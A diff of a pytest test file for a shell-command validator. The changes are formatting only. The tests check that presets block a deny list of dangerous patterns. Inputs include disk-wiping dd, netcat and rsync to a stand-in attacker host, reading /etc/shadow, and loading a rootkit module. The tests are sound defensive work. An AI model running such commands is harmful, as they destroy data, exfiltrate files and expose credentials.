@@ -4,17 +4,15 @@ Tests all three presets (strict, balanced, permissive),
 dangerous pattern detection, custom patterns, and policy management.
 """
 
-
 import pytest
 
 from executor.command_validator import (
-    CommandValidator,
     CommandPolicy,
+    CommandValidator,
     make_balanced_policy,
     make_permissive_policy,
     make_strict_policy,
 )
-
 
 # ---------------------------------------------------------------------------
 # Dangerous pattern detection (all presets)
@@ -32,12 +30,28 @@ class TestDangerousPatterns:
             preset=request.param,
             allowed_commands=frozenset(),
             trusted_paths=frozenset(),
-            dangerous_patterns=frozenset([
-                "rm -rf", "dd ", "mkfs", "fdisk", "shred",
-                " nc ", " ncat ", "scp ", "rsync ",
-                "sudo ", "sudo", "su ", "su:", "chmod 4755", "setuid",
-                "mount", "insmod", "modprobe",
-            ]),
+            dangerous_patterns=frozenset(
+                [
+                    "rm -rf",
+                    "dd ",
+                    "mkfs",
+                    "fdisk",
+                    "shred",
+                    " nc ",
+                    " ncat ",
+                    "scp ",
+                    "rsync ",
+                    "sudo ",
+                    "sudo",
+                    "su ",
+                    "su:",
+                    "chmod 4755",
+                    "setuid",
+                    "mount",
+                    "insmod",
+                    "modprobe",
+                ]
+            ),
         )
         return CommandValidator(policy=policy)
 
@@ -47,63 +61,63 @@ class TestDangerousPatterns:
         assert "Dangerous pattern" in reason
 
     def test_dd_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("dd if=/dev/zero of=/dev/sda")
+        valid, _reason = validator_with_dangerous.validate("dd if=/dev/zero of=/dev/sda")
         assert valid is False
 
     def test_mkfs_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("mkfs.ext4 /dev/sdb1")
+        valid, _reason = validator_with_dangerous.validate("mkfs.ext4 /dev/sdb1")
         assert valid is False
 
     def test_fdisk_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("fdisk -l")
+        valid, _reason = validator_with_dangerous.validate("fdisk -l")
         assert valid is False
 
     def test_shred_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("shred -n 3 file.txt")
+        valid, _reason = validator_with_dangerous.validate("shred -n 3 file.txt")
         assert valid is False
 
     def test_nc_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("run nc attacker.com 4444")
+        valid, _reason = validator_with_dangerous.validate("run nc attacker.com 4444")
         assert valid is False
 
     def test_ncat_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("run ncat attacker.com 8080")
+        valid, _reason = validator_with_dangerous.validate("run ncat attacker.com 8080")
         assert valid is False
 
     def test_scp_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("scp file.txt attacker:/tmp/")
+        valid, _reason = validator_with_dangerous.validate("scp file.txt attacker:/tmp/")
         assert valid is False
 
     def test_rsync_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("rsync -avz /data attacker.com:/backup")
+        valid, _reason = validator_with_dangerous.validate("rsync -avz /data attacker.com:/backup")
         assert valid is False
 
     def test_sudo_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("sudo cat /etc/shadow")
+        valid, _reason = validator_with_dangerous.validate("sudo cat /etc/shadow")
         assert valid is False
 
     def test_su_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("su - root")
+        valid, _reason = validator_with_dangerous.validate("su - root")
         assert valid is False
 
     def test_chmod_4755_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("chmod 4755 /tmp/backdoor")
+        valid, _reason = validator_with_dangerous.validate("chmod 4755 /tmp/backdoor")
         assert valid is False
 
     def test_setuid_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("./setuid-exploit")
+        valid, _reason = validator_with_dangerous.validate("./setuid-exploit")
         assert valid is False
 
     def test_mount_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("mount /dev/sdb1 /mnt")
+        valid, _reason = validator_with_dangerous.validate("mount /dev/sdb1 /mnt")
         assert valid is False
 
     def test_insmod_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("insmod /tmp/rootkit.ko")
+        valid, _reason = validator_with_dangerous.validate("insmod /tmp/rootkit.ko")
         assert valid is False
 
     def test_modprobe_blocked(self, validator_with_dangerous):
-        valid, reason = validator_with_dangerous.validate("modprobe rootkit")
+        valid, _reason = validator_with_dangerous.validate("modprobe rootkit")
         assert valid is False
 
 
@@ -117,7 +131,7 @@ class TestEmptyCommands:
 
     def test_none_command(self):
         v = CommandValidator()
-        valid, reason = v.validate(None)  # type: ignore[arg-type]
+        valid, _reason = v.validate(None)  # type: ignore[arg-type]
         assert valid is False
 
     def test_empty_string(self):
@@ -134,12 +148,12 @@ class TestEmptyCommands:
 
     def test_newlines_only(self):
         v = CommandValidator()
-        valid, reason = v.validate("\n\n")
+        valid, _reason = v.validate("\n\n")
         assert valid is False
 
     def test_tabs_only(self):
         v = CommandValidator()
-        valid, reason = v.validate("\t\t")
+        valid, _reason = v.validate("\t\t")
         assert valid is False
 
 
@@ -161,15 +175,15 @@ class TestBalancedPreset:
         assert reason == ""
 
     def test_bin_command_allowed(self, balanced_validator):
-        valid, reason = balanced_validator.validate("/bin/cat /etc/hosts")
+        valid, _reason = balanced_validator.validate("/bin/cat /etc/hosts")
         assert valid is True
 
     def test_usr_sbin_command_allowed(self, balanced_validator):
-        valid, reason = balanced_validator.validate("/usr/sbin/service nginx status")
+        valid, _reason = balanced_validator.validate("/usr/sbin/service nginx status")
         assert valid is True
 
     def test_sbin_command_allowed(self, balanced_validator):
-        valid, reason = balanced_validator.validate("/sbin/iptables -L")
+        valid, _reason = balanced_validator.validate("/sbin/iptables -L")
         assert valid is True
 
     def test_non_trusted_path_blocked(self, balanced_validator):
@@ -178,7 +192,7 @@ class TestBalancedPreset:
         assert "not in trusted paths" in reason
 
     def test_relative_path_blocked(self, balanced_validator):
-        valid, reason = balanced_validator.validate("./run-me")
+        valid, _reason = balanced_validator.validate("./run-me")
         assert valid is False
 
     def test_command_name_only_blocked(self, balanced_validator):
@@ -213,7 +227,7 @@ class TestStrictPreset:
         policy = make_strict_policy(allowed_commands=["/usr/bin/ls", "/usr/bin/cat"])
         v = CommandValidator(policy=policy)
 
-        valid, reason = v.validate("/usr/bin/ls -la")
+        valid, _reason = v.validate("/usr/bin/ls -la")
         assert valid is True
 
     def test_disallowed_command_blocked(self):
@@ -237,7 +251,7 @@ class TestStrictPreset:
         v = CommandValidator(policy=policy)
 
         # Exact path match with arguments
-        valid, reason = v.validate("/usr/bin/systemctl restart nginx")
+        valid, _reason = v.validate("/usr/bin/systemctl restart nginx")
         assert valid is True
 
     def test_strict_rejects_partial_path_match(self):
@@ -245,7 +259,7 @@ class TestStrictPreset:
         v = CommandValidator(policy=policy)
 
         # /usr/bin/systemctl should NOT match /usr/bin/sy
-        valid, reason = v.validate("/usr/bin/systemctl")
+        valid, _reason = v.validate("/usr/bin/systemctl")
         assert valid is False
 
     def test_strict_dangerous_patterns_still_apply(self):
@@ -276,11 +290,11 @@ class TestPermissivePreset:
         assert reason == ""
 
     def test_relative_path_allowed(self, permissive_validator):
-        valid, reason = permissive_validator.validate("./run-me")
+        valid, _reason = permissive_validator.validate("./run-me")
         assert valid is True
 
     def test_command_name_allowed(self, permissive_validator):
-        valid, reason = permissive_validator.validate("ls -la")
+        valid, _reason = permissive_validator.validate("ls -la")
         assert valid is True
 
     def test_dangerous_patterns_still_blocked(self, permissive_validator):
@@ -290,7 +304,7 @@ class TestPermissivePreset:
         assert "Dangerous pattern" in reason
 
     def test_sudo_blocked_in_permissive(self, permissive_validator):
-        valid, reason = permissive_validator.validate("sudo cat /etc/shadow")
+        valid, _reason = permissive_validator.validate("sudo cat /etc/shadow")
         assert valid is False
 
 
@@ -337,7 +351,7 @@ class TestCustomPatterns:
         v.add_custom_pattern("test-pattern")
         v.remove_custom_pattern("test-pattern")
 
-        valid, reason = v.validate("some test-pattern command")
+        _valid, reason = v.validate("some test-pattern command")
         # Pattern is removed, so it should no longer be blocked by custom patterns
         # In balanced mode, "some" is not a trusted path, so it fails for that reason
         assert "Custom pattern" not in reason
@@ -509,7 +523,7 @@ class TestWordBoundaryMatching:
         """Word boundary: 'mysudo' should NOT trigger sudo pattern."""
         policy = make_balanced_policy()
         v = CommandValidator(policy=policy)
-        valid, reason = v.validate("mysudo --do-something")
+        _valid, reason = v.validate("mysudo --do-something")
         # "mysudo" is not in trusted paths, so it fails balanced check
         # but NOT for dangerous pattern — it should fail for "not in trusted paths"
         assert "Dangerous pattern" not in reason
@@ -528,7 +542,7 @@ class TestWordBoundaryMatching:
         """Word boundary: 'amount' should NOT trigger mount pattern."""
         policy = make_balanced_policy()
         v = CommandValidator(policy=policy)
-        valid, reason = v.validate("amount something")
+        _valid, reason = v.validate("amount something")
         # "amount" is not in trusted paths, so it fails balanced check
         # but NOT for dangerous pattern
         assert "Dangerous pattern" not in reason
@@ -546,14 +560,14 @@ class TestWordBoundaryMatching:
         """Word boundary: 'concurrency' should NOT trigger nc pattern."""
         policy = make_balanced_policy()
         v = CommandValidator(policy=policy)
-        valid, reason = v.validate("concurrency check")
+        _valid, reason = v.validate("concurrency check")
         assert "Dangerous pattern" not in reason
 
     def test_dd_does_not_match_ddos(self):
         """Word boundary: 'ddos' should NOT trigger dd pattern."""
         policy = make_balanced_policy()
         v = CommandValidator(policy=policy)
-        valid, reason = v.validate("ddos-mitigation tool")
+        _valid, reason = v.validate("ddos-mitigation tool")
         assert "Dangerous pattern" not in reason
 
     def test_word_boundary_disabled_falls_back_to_substring(self):
@@ -600,6 +614,7 @@ class TestWordBoundaryMatching:
     def test_config_env_match_word_boundaries(self, monkeypatch):
         """Config field match_word_boundaries loads from env var."""
         from executor.config import ExecutorConfig
+
         monkeypatch.setenv("VENYA_EXECUTOR_COMMAND_VALIDATOR__MATCH_WORD_BOUNDARIES", "false")
         cfg = ExecutorConfig()
         assert cfg.command_validator.match_word_boundaries is False
@@ -607,5 +622,6 @@ class TestWordBoundaryMatching:
     def test_config_dangerous_patterns_field(self, monkeypatch):
         """Config field dangerous_patterns accepts custom list."""
         from executor.config import CommandValidatorConfig
+
         cfg = CommandValidatorConfig(dangerous_patterns=["custom-danger"])
         assert cfg.dangerous_patterns == ["custom-danger"]
